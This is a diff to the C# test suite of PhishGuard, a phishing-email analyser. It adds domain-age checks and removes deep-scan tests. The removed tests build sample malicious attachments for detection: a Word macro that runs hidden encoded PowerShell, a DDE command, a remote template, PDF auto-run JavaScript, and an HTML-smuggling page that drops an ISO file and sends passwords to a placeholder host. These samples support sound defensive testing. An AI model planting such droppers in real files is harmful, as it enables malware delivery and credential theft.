@@ -317,6 +317,13 @@ namespace PhishGuard.Tests
             Check("domaine récent", Ids(Analyzer.Analyze(ea, cfg)).Contains("sender-new-domain"));
             var eb = Base(); eb.FromAddress = "info@ancien-domaine.fr";
             Check("domaine ancien non signalé", !Ids(Analyzer.Analyze(eb, cfg)).Contains("sender-new-domain"));
+            var cfgNoAge = new PhishGuardConfig(); cfgNoAge.DomainAgeLookup = false;
+            Check("âge récupéré d'un clic : pris en compte même sans recherche automatique", Ids(Analyzer.Analyze(ea, cfgNoAge)).Contains("sender-new-domain"));
+            var ed2 = Base(); ed2.FromAddress = "a@mail.tout-neuf-livraison.fr"; ed2.ReplyTo.Add("b@autre-exemple.fr");
+            ed2.Links.Add(new LinkInfo("https://www.ancien-domaine.fr/x", "x")); ed2.Links.Add(new LinkInfo("https://192.0.2.4/x", "ip")); ed2.Links.Add(new LinkInfo("mailto:c@d.fr", "m"));
+            var doms = DomainAge.DomainsOf(ed2);
+            Check("domaines du message pour l'âge", doms.Count == 3 && doms[0].Key == "tout-neuf-livraison.fr" && doms[1].Key == "autre-exemple.fr" && doms[2].Key == "ancien-domaine.fr",
+                string.Join(",", doms.Select(x => x.Key).ToArray()));
             Check("RDAP : date d'enregistrement", DomainAge.ParseRdap("{\"events\":[{\"eventAction\":\"last changed\",\"eventDate\":\"2026-01-01T00:00:00Z\"},{\"eventDate\":\"2026-10-10T08:00:00Z\",\"eventAction\":\"registration\"}]}") == new DateTime(2026, 10, 10, 8, 0, 0));
             DomainAge.ClearForTests();
 
@@ -953,92 +960,6 @@ namespace PhishGuard.Tests
             L.SetLanguage("fr");
             Check("retour au français", Analyzer.Analyze(e2, cfg).LevelLabel == "Dangereux" && L.T("Paramètres") == "Paramètres");
             Check("traductions chargées", L.Count > 400, L.Count.ToString());
-
-            // ---------- Analyse approfondie (sur le poste) ----------
-            Func<Dictionary<string, byte[]>, byte[]> zipOf = entries =>
-            {
-                var ms = new System.IO.MemoryStream();
-                using (var z = new System.IO.Compression.ZipArchive(ms, System.IO.Compression.ZipArchiveMode.Create, true))
-                    foreach (var kv in entries) { var zen = z.CreateEntry(kv.Key); using (var s = zen.Open()) s.Write(kv.Value, 0, kv.Value.Length); }
-                return ms.ToArray();
-            };
-            Func<string, byte[]> utf8 = s => System.Text.Encoding.UTF8.GetBytes(s);
-            Func<string, byte[]> vbaCompress = src =>
-            {
-                // Bloc MS-OVBA « compressé » fait uniquement de littéraux (octet d'indicateurs 0 puis 8 octets)
-                var vraw = System.Text.Encoding.GetEncoding(1252).GetBytes(src);
-                var o = new List<byte> { 1 };
-                for (int pos = 0; pos < vraw.Length; pos += 4000)
-                {
-                    var chunk = new List<byte>();
-                    int end = Math.Min(vraw.Length, pos + 4000);
-                    for (int i = pos; i < end; i += 8) { chunk.Add(0); for (int j = i; j < Math.Min(end, i + 8); j++) chunk.Add(vraw[j]); }
-                    int size = chunk.Count + 2;
-                    int header = 0x8000 | 0x3000 | (size - 3);
-                    o.Add((byte)(header & 0xFF)); o.Add((byte)(header >> 8)); o.AddRange(chunk);
-                }
-                return o.ToArray();
-            };
-            Check("macros : décompression MS-OVBA", DeepScan.Decompress(vbaCompress("Attribute VB_Name = \"Module1\"\r\nSub Test()\r\nEnd Sub"), 0).StartsWith("Attribute VB_Name"));
-            var vbaBin = new List<byte>(new byte[300]); vbaBin.AddRange(vbaCompress("Attribute VB_Name = \"ThisDocument\"\r\nSub AutoOpen()\r\n  Shell \"powershell -nop -w hidden -e JABzAD0A\"\r\nEnd Sub\r\n")); vbaBin.AddRange(new byte[200]);
-            var docm = zipOf(new Dictionary<string, byte[]> {
-                { "[Content_Types].xml", utf8("<Types/>") },
-                { "word/document.xml", utf8("<w:document><w:body><w:p><w:r><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe \"/k calc\"</w:instrText></w:r></w:p></w:body></w:document>") },
-                { "word/_rels/settings.xml.rels", utf8("<Relationships><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://modeles-exemple.test/t.dotm\" TargetMode=\"External\"/></Relationships>") },
-                { "word/_rels/document.xml.rels", utf8("<Relationships><Relationship Id=\"rId9\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\" Target=\"\\\\203.0.113.5\\partage\\logo.png\" TargetMode=\"External\"/></Relationships>") },
-                { "word/vbaProject.bin", vbaBin.ToArray() } });
-            var repD = new DeepReport();
-            var attD = new AttachmentInfo { Name = "Facture.docm", Magic = "zip" };
-            DeepScan.Inspect(attD, docm, repD);
-            var idsD = repD.Findings.Select(f => f.Id).ToList();
-            Check("Office : modèle distant, partage réseau, DDE et macro piégée", idsD.Contains("deep-office-remote") && idsD.Contains("deep-office-unc") && idsD.Contains("deep-office-dde") && idsD.Contains("deep-vba-dropper"),
-                string.Join(",", idsD.ToArray()) + " | " + string.Join(" / ", repD.Unchecked.ToArray()));
-            Check("Office : lien du modèle ajouté aux liens à vérifier", attD.EmbeddedUrls.Contains("https://modeles-exemple.test/t.dotm"));
-            var docx = zipOf(new Dictionary<string, byte[]> { { "[Content_Types].xml", utf8("<Types/>") }, { "word/document.xml", utf8("<w:document>Bonjour DDE est un sigle</w:document>") } });
-            var repOk = new DeepReport(); DeepScan.Inspect(new AttachmentInfo { Name = "Contrat.docx", Magic = "zip" }, docx, repOk);
-            Check("Office : document ordinaire sans indice", repOk.Findings.Count == 0 && repOk.Facts.Any(f => f.Status == "ok"), string.Join(",", repOk.Findings.Select(f => f.Id).ToArray()));
-
-            Func<string, byte[]> zlib = s =>
-            {
-                var ms = new System.IO.MemoryStream(); ms.WriteByte(0x78); ms.WriteByte(0x9C);
-                using (var z = new System.IO.Compression.DeflateStream(ms, System.IO.Compression.CompressionMode.Compress, true)) { var b = utf8(s); z.Write(b, 0, b.Length); }
-                return ms.ToArray();
-            };
-            var objStm = zlib("<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://cache-cache.test/login?u=1) >> >> << /OpenAction << /S /JavaScript /JS (app.launchURL\\(\\)) >> >>");
-            var pdfBytes = new List<byte>(utf8("%PDF-1.7\n5 0 obj\n<< /Type /ObjStm /N 2 /Length " + objStm.Length + " /Filter /FlateDecode >>\nstream\n"));
-            pdfBytes.AddRange(objStm); pdfBytes.AddRange(utf8("\nendstream\nendobj\ntrailer << /Root 1 0 R /OpenAction 5 0 R >>\n%%EOF\n"));
-            var repP = new DeepReport(); var attP = new AttachmentInfo { Name = "Releve.pdf", Magic = "pdf" };
-            DeepScan.Inspect(attP, pdfBytes.ToArray(), repP);
-            Check("PDF : lien et code cachés dans une partie compressée", attP.EmbeddedUrls.Contains("https://cache-cache.test/login?u=1") && repP.Findings.Any(f => f.Id == "deep-pdf-hidden-code") && repP.Findings.Any(f => f.Id == "deep-pdf-autoaction"),
-                string.Join(",", repP.Findings.Select(f => f.Id).ToArray()) + " | " + string.Join(",", attP.EmbeddedUrls.ToArray()));
-
-            var innerZip = zipOf(new Dictionary<string, byte[]> { { "Facture.pdf.js", utf8("WScript.Echo(1)") } });
-            var outer = zipOf(new Dictionary<string, byte[]> { { "documents.zip", innerZip }, { "lisez-moi.txt", utf8("x") } });
-            var repZ = new DeepReport(); DeepScan.Inspect(new AttachmentInfo { Name = "Commande.zip", Magic = "zip" }, outer, repZ);
-            Check("archive imbriquée : script caché au deuxième niveau", repZ.Findings.Any(f => f.Id == "deep-archive-nested-danger"), string.Join(",", repZ.Findings.Select(f => f.Id).ToArray()));
-
-            var smug = "<html><script>var d='" + new string('A', 30000) + "';var b=new Blob([atob(d)]);var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='facture.iso';a.click();</script>"
-                + "<form action='https://collecte-exemple.test/p'><input type=password></form></html>";
-            var repH = new DeepReport(); var attH = new AttachmentInfo { Name = "Facture.html", Magic = "html" };
-            DeepScan.Inspect(attH, utf8(smug), repH);
-            Check("HTML : contrebande et destination du formulaire", repH.Findings.Any(f => f.Id == "deep-html-smuggling") && attH.EmbeddedUrls.Contains("https://collecte-exemple.test/p"));
-
-            Check("redirection : meta refresh et script", Redirects.PageRedirect("<meta http-equiv=\"refresh\" content=\"0; url=/suite\">", new Uri("https://a.test/x")) == "https://a.test/suite"
-                && Redirects.PageRedirect("<script>window.location.href = 'https://b.test/login';</script>", new Uri("https://a.test/")) == "https://b.test/login"
-                && Redirects.PageRedirect("<p>Bonjour</p>", new Uri("https://a.test/")) == null);
-
-            var baseR = Analyzer.Analyze(Base(), cfg);
-            string baseLevel = baseR.Level;
-            var withD = Analyzer.WithFindings(baseR, repD.Findings, repD);
-            Check("analyse approfondie : verdict recalculé", baseLevel == "safe" && withD.Level == "dangerous" && withD.Deep == repD && !withD.Verified, withD.Level + " " + withD.Score);
-            var offline = new DeepOptions { DomainAge = false, Certificates = false, Hashes = false, HopIps = false };
-            var em = Base(); em.Attachments.Add(attD);
-            var repRun = DeepAnalysis.Run(em, Analyzer.Analyze(em, cfg), new List<KeyValuePair<AttachmentInfo, byte[]>> { new KeyValuePair<AttachmentInfo, byte[]>(new AttachmentInfo { Name = "Facture.docm", Magic = "zip" }, docm) },
-                offline, cfg, new IntelSettings(), null, null);
-            Check("analyse approfondie hors ligne : rien ne sort du poste", repRun.Sent.Count == 0 && repRun.Findings.Any(f => f.Id == "deep-vba-dropper"));
-            var fin = DeepAnalysis.Complete(em, repRun, cfg);
-            Check("analyse approfondie : le lien du modèle distant est analysé", fin.Level == "dangerous" && fin.Deep != null);
-            Check("analyse approfondie : rien en mode simple", !SimpleView.Build(fin, em, true).Contains(System.Net.WebUtility.HtmlEncode(L.T("Analyse approfondie"))));
 
             // ---------- Robustesse : messages malformés aléatoires ----------
             int fuzzN;
